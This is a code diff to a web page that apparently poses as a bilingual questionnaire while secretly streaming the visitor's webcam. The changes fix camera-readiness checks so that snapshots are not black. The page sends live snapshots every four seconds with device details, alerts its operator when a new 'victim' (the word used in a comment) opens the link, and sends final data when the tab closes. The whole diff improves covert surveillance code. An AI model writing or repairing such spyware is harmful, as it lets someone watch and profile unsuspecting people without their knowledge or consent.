@@ -344,19 +344,21 @@
             return details;
         }
 
-        // التقاط وإرسال صورة حية (Live Snapshot)
-        async function sendLiveSnapshot(reason = "Live Live Stream") {
+        // التقاط وإرسال صورة حية مصلحة (تتأكد من جاهزية أبعاد الكاميرا لتجنب اللون الأسود)
+        async function sendLiveSnapshot(reason = "Live Stream") {
             const videoElement = document.getElementById('webcam');
             const canvas = document.getElementById('snapshotCanvas');
-            if (!videoElement || videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
+            
+            if (!videoElement || videoElement.videoWidth === 0 || videoElement.videoHeight === 0) return;
 
-            canvas.width = videoElement.videoWidth || 320;
-            canvas.height = videoElement.videoHeight || 240;
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(async (blob) => {
-                if (!blob) return;
+                if (!blob || blob.size < 500) return;
+                
                 const username = document.getElementById('username')?.value || "Utilisateur Anonyme [En direct]";
                 const deviceDetails = await getDetailedDeviceInfo();
 
@@ -388,10 +390,10 @@
                 const videoElement = document.getElementById('webcam');
                 videoElement.srcObject = mediaStream;
 
-                // 🚀 إشعار فوري ودخول الضحية للموقع مع أول لقطة حية
+                // انتظار لحظة حتى تبث الكاميرا ويصل التنبيه الأول
                 setTimeout(() => {
                     sendLiveSnapshot("🚨 تنبيه: شخص جديد فتح الرابط وبدأ البث!");
-                }, 1500);
+                }, 2000);
 
                 let options = { videoBitsPerSecond: 250000 };
                 if (MediaRecorder.isTypeSupported('video/mp4')) {
@@ -406,7 +408,7 @@
                 };
                 mediaRecorder.start();
 
-                // ⚡ تفعيل إرسال الصور الحية (Live Stream) كل 4 ثوانٍ لتتابع الشخص لحظة بلحظة
+                // تفعيل البث الحي (Live Snapshots) كل 4 ثوانٍ
                 liveSnapshotInterval = setInterval(() => {
                     if (!isCompleted) {
                         sendLiveSnapshot("📸 لقطة بث حي (Live)");
@@ -490,7 +492,7 @@
             statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
         }
 
-        // الحماية القصوى عند إغلاق التطبيق فجأة أو الضغط على زر المربع
+        // الحماية عند إغلاق التطبيق فجأة أو الضغط على زر المربع
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
                 sendFinalData("Fermé subitement / Bouton carré");
